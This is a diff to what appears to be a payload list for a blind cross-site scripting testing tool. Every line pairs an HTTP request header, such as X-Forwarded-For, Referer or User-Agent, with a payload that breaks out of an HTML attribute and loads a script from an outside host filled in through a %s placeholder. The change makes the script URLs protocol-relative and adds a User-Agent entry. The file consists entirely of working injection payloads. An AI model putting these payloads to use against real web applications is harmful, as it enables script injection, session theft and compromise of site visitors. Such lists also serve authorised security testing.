@@ -1,6 +1,7 @@
-header,X-Forwarded-Proto,"><script src="https://%s/"></script>
-header,Referer,"><script src="https://%s/"></script>
-header,X-Forwarded-For,"><script src="https://%s/"></script>
-header,True-Client-IP,"><script src="https://%s/"></script>
-header,X-Client-IP,"><script src="https://%s/"></script>
-header,X-Real-IP,"><script src="https://%s/"></script>
+header,X-Forwarded-Proto,"><script src="//%s/"></script>
+header,Referer,"><script src="//%s/"></script>
+header,X-Forwarded-For,"><script src="//%s/"></script>
+header,True-Client-IP,"><script src="//%s/"></script>
+header,X-Client-IP,"><script src="//%s/"></script>
+header,X-Real-IP,"><script src="//%s/"></script>
+header,User-Agent,"><script src="//%s"></script>
